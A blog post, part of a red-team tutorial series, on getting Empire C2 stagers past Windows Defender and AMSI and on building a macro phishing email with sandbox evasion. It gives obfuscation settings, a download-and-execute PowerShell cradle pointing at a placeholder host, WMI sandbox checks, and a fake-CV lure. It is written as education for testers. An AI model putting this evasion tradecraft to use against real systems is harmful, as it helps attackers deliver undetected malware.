---
title: RedTeam Exercises with OpenSource Tools part 2
author: WHmacmac
layout: post
permalink: RedTeam_Exercises_with_OpenSource_Tools_Part_2
category: blog
---

Hello again :).<br/> 
It took me longer than I anticipated to write the second part. The guys from BC-Security announced on April 4th 2020 that they have made Empire's stager undetectable. Microsoft did not wait to see Empire being used in the wild and updated the Windows Defender with new signatures against our beloved Empire's stagers. As per below, I will show you how to apply what you've learnt from the first <a href="https://whmacmac.github.io/RedTeam_Exercises_with_OpenSource_Tools_Part_1" style="text-decoration: none;">part</a> of my article.

## Contents
* [Intro scenarios](#shortintro)
* [Scenario 1](#scenario1)
* [Scenario 2](#scenario2)

## Intro scenarios {#shortintro}

I finished the first part promising that I will apply the theory on some real world cases. Without other words, let's see what scenarios I will approach:
<ul>
<li>Scenario 1: I consider I have already obtained access in the network via a service exploit, web application vulnerability or through a phishing email. I will explore some ways of upgrading the dumb shell without being detected by WindowsDefender.</li>
 <li>Scenario 2: I was talking about a RedTeam exercise in my first article, am I right? What kind of RedTeam Exercise is that if I don't use of a phishing mail? I will build from 0 a phishing email where I will explore anti-sandbox techniques.</li>
</ul>

I considered that we all encountered situations where we were limited by a dumb shell. We could not upgrade it if we do not take all the necessary measures against a security solution. I found myself in the situation where I could access the target's network only through a phishing email.<br/>
I wanted to develop a simple malware that it uses the multi stager feature of the Empire framework. What I want to do is a malware that will fit in the real world scenarios. <b>Also all what I show you is for education purposes only. Do not apply it outside of your network.</b><br/>
Lets talk a bit about how our phishing mail from the 2nd scenario will look, how I was thinking its arhitecture, what difficulties I am expecting to encounter during its delivery or execution. 

<ul>
<li>Phase 1 and 2: They are referring to successfully deliver the email in the user's inbox. Depending on the type of infrastructure I am targeting, I expect to encounter a mail protection with the ability to detect and eventualy detonate my attachment in a sandbox. We have to take the proper measures to avoid being detected by the security gateway. In case we are detected, then we should make sure to instruct the payload to don't start the execution process in the analysis machine. If I am flagged by a security protection, I will have to remake the payload.</li> 
<li>Phase 3: It implies our social engineering skills. I have to make the user to enable the macro or to execute it through a tricky mechanism (example: macro in excel fields). Since Microsoft Office is the most used email client, I will focus only on its security protections. Microsoft has developed a sandbox mode which is a security feature that prevents access from running certain expressions that could be unsafe.</li>
<li>Phase 4: If I made the user to enable the macros or to do whatever method I thought for executing it in the background, my script will check if it is running in a sandbox. If it does, then it will stop the execution process. The VBs script, beside the sandbox checkings, contains the code for loading the dropper in memory. As a process tree, it will look like the following: "Office" process -> VBs interpreter -> Powershell.</li>
<li>Phase 5: The dropper will contact a decoy server for downloading the first stager in memory. I have chosen to use a decoy server in my malware arhitecture for covering up the posibility to have blocked my primary C2 by a SOC team.</li>  
<li>Phase 6: My decoy server will send the first stager to the victim. The stager is loaded directly in the memory..</li>  
<li>Phase 7,8,9,10: The payload from phase 7 is the launcher, that code part that has to be obfuscated. If it runs successfully, it will reach the Empire server. The C2 server will respond with the "stager 1" that makes all of the keys negotiation. Finally, it loads the Empire agent that enables all of my command and control functionalities. If you prefer, you can take a look at the scheme of how Empire agents are working <a href="https://testmactest.github.io/RedTeam_Exercises_with_OpenSource_Tools_Part_1#howdoimakeuseofopensource" style="text-decoration: none;">here</a></li>
</ul>

All of the mentioned phases are found in the below scheme. 
<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools-Part-1.md/arhitecturef.png">
 </center>
</div>

The first scenario uses the same steps from the second scenario, starting from 5th phase. This first scenario is necessary for having an operational phishing email.

I divided my testing work in half in order to bypass Windows Defender and AMSI rules: one part for testing the stager's evasion capabilities. And the second part is focused on testing and developing anti-sandbox features and a way to bypass the Office's sandbox mode. 

## Scenario 1 {#scenario1}
I will not show all the tests that I did in order to observe and analyze the Windwos Defender's behavior and the AMSI rules. In my examples, I am using multi/launcher stager.<br/>
In the first scenario, I consider that I already have obtained access in the network via a service exploit, web application vulnerability or through a phishing email.<br/>

As I said in the first part, if you are using Empire with default configuration, it will be caught by Windows Defender. It can not pass the system protections, so you need to make some changes or to obfuscate it.
Even if Empire framework is coming with a lot of obfuscation methods or evasion capabilities, Microsoft created a set of signatures based on Empire's stagers behavior, strings, stager's code, and so on. 

In my tests, I observed that the following patterns are flagged:<br/>

<b>1. SafeChecks:</b><br/>
The stager is coming with SafeChecks enabled by default. Taking a look at what SafeChecks is doing, we can notice that the powershell's verison is greater or equal with 3. This can be used as a part of a complex rule for detecting the Empire. I do  recommend to disable it.
<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools-Part-1.md/powershellversion.png">
 </center>
</div>

<b>2. Rules based on the order of the code's postion:</b><br/>
BC-Security announced on <a href="https://twitter.com/BCSecurity1/status/1247165928757800965" style="text-decoration: none;"> April 6th 2020</a> that they updated their HTTP listener to evade Windows Defender again. I was curious and took a look on their <a href="https://github.com/BC-SECURITY/Empire/pull/148/commits/3bc0eb6e435f39981092ed823da623e22146d2bc" style="text-decoration: none;">commit</a> on their Github repository to see what changes they did.

<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools-Part-1.md/httpevader.png">
 </center>
</div>
 
 As I suspected, the order of functions is a really big way how AMSI is fingerprinting now. So to bypass AMSI, we just have to reorder those commands that are idependent.<br/> 
 You can move a number of independent position commands to break the Microsoft's signatures.

<b>3. Default Obfuscation:</b><br/>
Empire is using as default the "Token\All\1" obfuscation. I observed in my tests that any of the \all options in Invoke-Obfuscation are likely to get caught. Try using a custom combination of the sub options.<br/>
In my tests I used the following list: again you can use any custom combination you prefer, just don't break the limit of 8191 characters that Powershell interpreter is accepting. 
{% highlight powershell %}
set ObfuscateCommand Token\String\1,1,2,1, Encoding\2, Compress\1
set ObfuscateCommand Token\String\1,1,2,1, Token\Variable\1, Encoding\2, Compress\1
set ObfuscateCommand Token\String\1,1,2,1, Token\Variable\1, Encoding\2, Compress\1, Token\Whitespace\1,1,1
set ObfuscateCommand Token\String\1,1,2,1, Token\Variable\1, Encoding\2, Compress\1, Token\Whitespace\1,1,1, Token\Variable\1
set ObfuscateCommand Token\String\1,1,2,1, Encoding\2, Compress\1
set ObfuscateCommand AST\SCRIPTBLOCKAST\1, Encoding\1, Compress\1
set ObfuscateCommand AST\SCRIPTBLOCKAST\1, Encoding\1

{% endhighlight %}

Microsoft anticipated only a limited number of custom combination using Invoke-Obfuscation. Take your time and do more complex custom combinations keeping in mind to don't break the limit.

<b>4. Suspicious key words</b><br/>
It is well known that some powershell arguments were abused in the last years. If you are working as a blue teamer, I am pretty sure you know which are these "widely used" arguments in attacks:

<ul>
 <li>NoProfile – indicates that the current user’s profile setup script should not be executed when the PowerShell engine starts.</li>
  <li>NonI – shorthand for -NonInteractive, meaning an interactive prompt to the user will not be presented.</li> 
 <li>W Hidden – shorthand for “-WindowStyle Hidden”, which indicates that the PowerShell session window should be started in a hidden manner.</li> 
 <li>Exec Bypass – shorthand for “-ExecutionPolicy Bypass”, which disables the execution policy for the current PowerShell session (default disallows execution). It should be noted that the Execution Policy isn’t meant to be a security boundary.</li> 
 <li>encodedcommand – indicates the following chunk of text is a base64 encoded command.</li> 
 </ul>

The Empire's stager (multi/launcher) is coming with the 'encodedcommand' command as enabled by default. Besides this, the empire's listeners (HTTP listener) use all of the arguments provided above as part of the launcher syntax. When they are used together, most likely there is something suspicious. Use only 'noninteractive' or '-windowsstyle hidden' if it is needed.

<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools-Part-1.md/launcher.png">
 </center>
</div>

I recommend to turn base64 off. It doesn't add anything to your obfuscation while trying to avoid Defender. It's just used because it's the easiest way to handle sending the command in a string. Once you have your obfuscated code you can re-encode it if you really want to use this method. <br/>
Most security related solutions created features for detecting base64 encoded strings and analyzing them after the content is decoded. CarbonBlack, FireEye made public their sollutions' capabilities in the past, being clear for us that the above arguments are using as a part of their detection rules: you can read more <a href="https://www.carbonblack.com/2015/08/14/how-to-detect-powershell-empire-with-carbon-black/" style="text-decoration: none;">here</a> and <a href="https://www.fireeye.com/blog/threat-research/2018/07/malicious-powershell-detection-via-machine-learning.html" style="text-decoration: none;">here</a>.  

<br/><br/>Now that I identified almost all the patterns that are triggering the Microsoft's signatures, let's talk about the dropper before starting with the demo.

### Dropper <br/>
Possibly many of you use the powershell command "IEX((New-Object System.Net.WebClient).downloadstring('http://something'));" for downloading in memory your payload. I worked in a SOC and I know the strings like "new-object", "Webclient", "downloadstring" are used by many for detecting suspicious events. I will make use of an open source <a href="https://github.com/danielbohannon/Invoke-CradleCrafter" style="text-decoration: none;">tool</a> made special for this kind of tasks.<br/>
Invoke-CradleCafter is a tool special created for automating the process for making obfuscated downloaders in memory or on disk. 

In my example I am using "MEMORY\PSCOMPILEDCSHARP\INVOKE\10". I invite you to take a look on it in case you are interested in using it. If you are a blue teamer, you may be interested in testing your detection capabilities of your SIEM/HIDS with Invoke-CradleCafter.
<br/> I can also obfuscate more the dropper with Invoke-Obfuscation, for escaping the most exotic SIEM/HIDS rules but I am not doing it this time. 

<div>
<center><img src="/images/2020-04-11-RedTeam-Exercises-with-OpenSource-Tools-Part-1.md/cradle.png">
 </center>
</div>

<br/> Now it is the time for what all of you wanted to see.

### Demo <br/>
My tests are done on an up-to-date Windows Pro OS with Windows Defender enabled. (all of the updates were done before filming the video - 21 April 2020).
<iframe width="560" height="315" src="https://www.youtube.com/embed/bPnt3d7igX8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

As you could see, Microsoft didn't know what hit it.

## Scenario 2 {#scenario2}
A word before starting: I could not get an Office license for testing my phishing mail against Office's sandbox mode. I am using ThunderBird client connected to a testing Gmail account in my example.<br/>
Because of this inconvenience, I have decided to make one more article focused only on phishing mails. I promise that I will use Office as mail client next time. Also I will explore more examples of making use of phishing emails besides the embedded macro example that will follow, each of them being fully undetectable. When I say examples, I am reffering at making use of Object Linking and Embedding (OLE) Object , HTML Application (HTA), scenarios where I am hosting a .docx.jar or .docx.exe file in a cloud platform, and much more. Sorry again for the inconvenience.

This being said, let's start. In this example I will send a phishing mail with my CV to a fictive HR person. Because I have written my CV in "LibreOffice Writter", some of my text is not visible so it is needed to enable the macro for fully viewing my resume. This would be the main idea of the message from mail's body; does it seem legit? Do I raise any suspicion?<br/>
The majority of my clients were using a gateway protection so let's take a look at how to make sure our email is not flagged as malicious or suspicious.

### Sandbox Detection and Evasion
What is a Sandbox? It is a software created environment that isolates and limits the rights and accesses of a process being executed. This is an efficient way of doing behavioral analysis for AntiMalware/AntiVirus sollutions. <br/>
As we saw earlier, obfuscating code to break signatures can be relatively trivial. AntiMalware or AntiVirus solutions would need an almost unlimited number of signatures. Also heavily obfuscated code can make it almost impossible for human analysis to be effective. Behavior analysis appeared as a solution to this problem. <br/>
This seems to be the perfect way for identifing those suspicious files which can not be analyzed static. However all sandbox has limitations which again, it is in our advantage:
<ul>
 <li>Sandboxes use a lot of resources which can be expensive. Just try to run a few instances of Cuckoo Sandbox in parallel and you will see what I am talking about. </li>
  <li>End users do not want to wait to receive their messages. </li>
 <li>Email scanning requires thousands of attachments to be evaluated constantly. </li>
</ul>

These limitations help us with several means to try and detect or evade them:
<ul><li>Time delays. Email filters have a limited amount of time to scan files so delay it until the scan is completed. This is less practical in a macro as it will keep the document open until done waiting.</li> 
 <li>Auto open vs close.</li>
<li>Password protection. The sandbox does not know the password and therefore can not open the file. No results are found so the file is sent to the user's inbox. However it has a lower success rate. We have to make the user to find it legit.</li>
<li> Check for limited resources (small amount of rams, single core, etc.). Using WMI Objects you can enumerate the hardware and system configurations. Some malwares look for things like the presence of a fan. WMI objects are very inconsistenly implemented by manufactures.
 {% highlight powershell %}
Get-WmiObject win32_fan
Get-WmiObject win32_ComputerSystem
Get-WmiObject win32_LogicalDisk
Get-WmiObject win32_videocontroller

{% endhighlight %}
</li>
 <li> Look for virtualization processes (sandboxie, Vmware tools).
Some processes to look for: Vmtools, VBoxService, Sbiesvc, SbieCtrl
{% highlight powershell %}
 Get-WmiObject win32_process
 
{% endhighlight %}
</li> 
</ul>

However I can not guarantee that all of the mentioned tips will work. Try to learn as much as possible about your target. Check attack.mitre.org to look for new techqniques if the old ones fail. Use multiple conditions.


Please check again in few days, the article is not finished.
Note - April 25th 2020 - WindowsDefender is capable of detecting my Empire stager from phases 8,9,10. Even if it is allowing me to execute in background, it is requesting if I want to submit some streams in their Cloud Sandbox for further analysis. Empire Framework has an option for allowing connections only from stagers running under a specific username or from a specific IP address. This is supposing to block Microsoft Sandbox's analysis.
<br/> As a conclusion, I have to rewritten or to reorder the position of those independent lines of codes in the listener/stager in order to break Microsoft's signatures. Scenario 2 is still working without being detected at this moment but you have to come with a new combination of invoke-obfuscation.



References:<br/>
https://support.office.com/en-us/article/Turn-sandbox-mode-on-or-off-to-disable-macros-8CC7BAD8-38C2-4A7A-A604-43E9A7BBC4FB
